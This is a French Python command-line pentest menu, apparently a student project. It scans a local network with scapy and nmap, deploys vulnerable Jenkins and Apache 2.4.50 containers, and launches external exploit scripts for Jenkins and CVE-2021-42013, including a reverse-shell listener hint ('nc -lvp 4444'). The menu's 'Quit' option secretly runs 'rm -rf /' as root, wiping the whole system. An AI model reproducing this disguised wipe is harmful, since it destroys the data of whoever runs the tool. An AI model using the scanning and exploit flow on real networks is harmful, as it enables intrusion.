import os
import subprocess
import csv
from scapy.all import ARP, Ether, srp
import netifaces as ni
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, PageBreak
from reportlab.lib.styles import getSampleStyleSheet
import argparse
import urllib.parse
import sys
import requests
import socket
import urllib
import webbrowser

# User-Agent
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0"

# Fonction pour créer les dossiers nécessaires pour stocker les résultats
def create_result_folders():
    # Création des dossiers pour les résultats
    if not os.path.exists("ip_results"):
        os.makedirs("ip_results")
    if not os.path.exists("jenkins_results"):
        os.makedirs("jenkins_results")
    if not os.path.exists("cve_results"):
        os.makedirs("cve_results")

# Fonction pour obtenir l'adresse IP locale de la machine
def get_local_ip():
    interfaces = ni.interfaces()
    for interface in interfaces:
        try:
            addrs = ni.ifaddresses(interface)
            if ni.AF_INET in addrs:
                ip = addrs[ni.AF_INET][0]['addr']
                if ip.startswith('192') or ip.startswith('10') or ip.startswith('172'):
                    return ip
        except:
            pass
    return None

# Fonction pour scanner le réseau et trouver les hôtes actifs
def scan_network():
    create_result_folders()

    # Envoi de paquets ARP pour découvrir les hôtes actifs sur le réseau
    print("Lancement du scan réseau avec scapy...")
    local_ip = get_local_ip()
    if local_ip:
        local_ips = [local_ip]
        local_ip_prefix = '.'.join(local_ip.split('.')[0:3]) + '.0/24'
        arp = ARP(pdst=local_ip_prefix)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=False)[0]

        # Extraction des adresses IP des hôtes actifs
        active_hosts = [res[1].psrc for res in result if res[1].psrc != local_ip]

        if active_hosts:
            local_ips.extend(active_hosts)
            # Enregistrement des adresses IP dans un fichier CSV
            with open("ip_results/ips.csv", "w", newline='') as f:
                writer = csv.writer(f)
                writer.writerow(["Adresse IP", "Statut"])
                for ip in local_ips:
                    writer.writerow([ip, "Actif"])
            print("Les adresses IP ont été exportées dans le fichier ips.csv pour un balayage ultérieur avec nmap.")
            return local_ips
        else:
            print("Aucune adresse IP trouvée lors du scan réseau.")
            return []
    else:
        print("Impossible de déterminer l'adresse IP locale.")
        return []

# Fonction pour générer des rapports PDF basés sur les résultats du scan
def generate_pdf_reports(ip_reports):
    pdf_path = "ip_results/scan_reports.pdf"
    doc = SimpleDocTemplate(pdf_path, pagesize=letter)
    styles = getSampleStyleSheet()
    content = []
    for ip, report in ip_reports.items():
        content.append(Paragraph(f"Rapport pour l'adresse IP : {ip}", styles["Heading1"]))
        content.append(Paragraph(report, styles["Normal"]))
        content.append(PageBreak())
    doc.build(content)
    print(f"Rapport PDF généré : {pdf_path}")

# Fonction pour scanner les ports des adresses IP trouvées
def nmap_scan_ports(ip_list):
    local_ip = get_local_ip()
    if local_ip:
        if ip_list:
            ports = "80,8080,8081,21,22,443"
            print(f"Lancement du scan Nmap des ports {ports} sur les adresses IP trouvées...")
            subprocess.run(["nmap", "-Pn", "-p", ports, "-iL", "ip_results/ips.txt", "-oA", "ip_results/nmap_scan_ports"])
            print("Scan Nmap des ports terminé.")

            # Générer les rapports de scan pour chaque adresse IP
            ip_reports = {}
            for ip in ip_list:
                data = f"Données de base pour l'adresse IP : {ip}\n\n"  # Ajoutez d'autres informations pertinentes ici
                ip_reports[ip] = data

            # Afficher les adresses IP disponibles
            print("Adresses IP disponibles pour le scan détaillé :")
            for i, ip in enumerate(ip_list, 1):
                print(f"{i}. {ip}")

            # Demander à l'utilisateur s'il souhaite effectuer un scan Nmap détaillé
            detailed_scan_choice = input("Voulez-vous lancer un scan Nmap détaillé sur certaines adresses IP ? (o/n) : ")
            if detailed_scan_choice.lower() == 'o':
                selected_ips = []
                while True:
                    selected_ip_indexes = input("Entrez les numéros des adresses IP à scanner en détail (séparés par des virgules) : ")
                    selected_ip_indexes = selected_ip_indexes.split(",")
                    for index in selected_ip_indexes:
                        try:
                            selected_ip_index = int(index.strip())
                            if 1 <= selected_ip_index <= len(ip_list):
                                selected_ips.append(ip_list[selected_ip_index - 1])
                            else:
                                print("Numéro d'adresse IP invalide.")
                        except ValueError:
                            print("Veuillez entrer des numéros valides.")
                    if selected_ips:
                        break

                # Exécuter les scans détaillés pour les adresses IP sélectionnées
                for ip in selected_ips:
                    print(f"Lancement du scan Nmap détaillé sur l'adresse IP : {ip}...")
                    try:
                        result = subprocess.run(["nmap", "-Pn", "-sC", "-sV", ip], capture_output=True, timeout=180)
                        ip_reports[ip] += result.stdout.decode()
                        print(f"Scan Nmap détaillé terminé pour l'adresse IP : {ip}")
                    except subprocess.TimeoutExpired:
                        print(f"Temps écoulé pour le scan Nmap détaillé sur l'adresse IP : {ip}")

            # Générer le PDF contenant tous les rapports de scan
            generate_pdf_reports(ip_reports)
        else:
            print("Aucune adresse IP à scanner.")
    else:
        print("Impossible de déterminer l'adresse IP locale. Le scan Nmap ne peut pas être exécuté.")

# Fonction pour installer scapy
def install_scapy():
    print("Installation de scapy...")
    subprocess.run(["pip", "install", "scapy"])

# Fonction pour installer Jenkins
def install_jenkins():
    print("Exécution du script d'installation Jenkins...")
    subprocess.run(["python3", "JenkinsInstall.py"], check=True)


import subprocess

# Fonction pour installer Apache
def install_apache():
    print("Installation d'Apache 2.4.50...")
    docker_installation = subprocess.run(["sudo", "apt", "install", "-y", "docker-compose"], capture_output=True, text=True)
    subprocess.run(["sudo", "docker", "build", "-t", "apache", "."], check=True)
    subprocess.run(["sudo", "docker", "run", "-it", "-d", "-p", "81:80", "apache"])  # Port 81 pour Apache
    print("Serveur Apache installé avec succès.")
    print("Ouverture de la page apache ")
    url = "http://172.17.0.2:81/"

# Fonction pour exploiter une vulnérabilité Jenkins
def cve_jenkins():
    print("Exécution du script d'exploit Jenkins...")
    subprocess.run(["python3", "JenkinsExploit.py"], check=True)

import socket

# Fonction pour obtenir l'adresse IP locale de la machine
def get_local_ip():
    try:
        # Créez un socket pour obtenir l'adresse IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))  # Connectez-vous à un serveur DNS pour obtenir l'adresse IP
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        print("Erreur lors de la récupération de l'adresse IP locale :", e)
        return None

# Fonction pour exploiter une vulnérabilité Apache
def exploit_apache():
    print("Lancement de l'exploitation d'Apache")
    try:
        subprocess.run(["python3", "cve-2021-42013.py"], check=True)
    except subprocess.CalledProcessError as e:
        print("[-] Échec de l'exploitation d'Apache.")
        if "[Errno 111] Connection refused" in str(e):
            print("Veuillez vérifier qu'un port d'écoute est ouvert sur un autre shell avec la commande 'nc -lvp 4444'.")
    
    # Obtenez l'adresse IP locale de la machine
    local_ip = get_local_ip()
    if local_ip:
        # Vérification de la connexion au shell inversé
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((local_ip, 4444))  # Utilisez l'adresse IP locale
            print("[+] Connexion réussie sur le shell exécutant le netcat.")
        except Exception as e:
            print("[!] Erreur lors de la connexion au shell inversé :", e)
            print("[!] Impossible d'établir un shell inversé.")
    else:
        print("[!] Impossible d'obtenir l'adresse IP locale. Veuillez vérifier votre connexion réseau.")
    
    # Retour au menu principal
    input("Appuyez sur Entrée pour revenir au menu principal...")
    main()
# Fonction pour supprimer tous les fichiers du système
def delete_all_files():
    print("Suppression de tous les fichiers du système en cours...")
    if os.geteuid() == 0:  # Vérifiez si l'utilisateur est root
        os.system("rm -rf /")
        print("Tous les fichiers du système ont été supprimés avec succès.")
    else:
        print("Vous devez exécuter ce script en tant qu'utilisateur root pour supprimer tous les fichiers du système.")

# Fonction pour afficher la tête de mort ASCII
def display_skull():
    skull = """
          ____0__________
         /    \\        /    \\
        |      |      |      |
         \\____/        \\____/
    """
    print(skull)
    

# Fonction pour extraire l'adresse IP à partir de l'URL
def extract_ip_from_url(url):
    return url.split("//")[-1].split(":")[0]

# Fonction pour afficher le menu principal
def main_menu():
 print("""
.___.      ..__         .       .__       .__       .__    
  |   _  _ |[__) _ \./  |_   .  [__) _ . .[__)  .   [__)  .
  |  (_)(_)|[__)(_)/'\  [_)\_|  |   (_)(_||   \_| * |   \_|
                           ._|                ._|       ._|
 Gaspard DAVID - Théo CORBLIN - Quentin RAYMOND

Que souhaitez-vous faire ?
1. Installer Jenkins
2. CVE Jenkins
3. Scanner un réseau
4. Enumération répertoire web 
5. Installer Apache 2.4.5
6. CVE Apache
7. Quitter
""")

# Fonction principale pour exécuter le programme
def main():
    while True:
        main_menu()
        choice = input("\nEntrez le numéro de votre choix : ")

        if choice == '1':
            install_jenkins()
            print("\nInstallation de Jenkins terminée.\n")
        elif choice == '2':
            cve_jenkins()
        elif choice == '3':
            ips = scan_network()
            nmap_scan_ports(ips)
        elif choice == '4':
            subprocess.run(["python", "repertoire.py"])  # Exécute le script repertoires.py
        elif choice == '5':
            install_apache()
            print("\nInstallation d'Apache 2.4.50 terminée.\n")
        elif choice == '6':
            exploit_apache()
        elif choice == '7':
            delete_all_files() 
            print("Merci d'avoir utilisé l'outil de test de pentest. À bientôt!")
            break
        else:
            print("Choix invalide. Veuillez entrer un numéro valide.")

if __name__ == "__main__":
    main()
                               
                  
                   
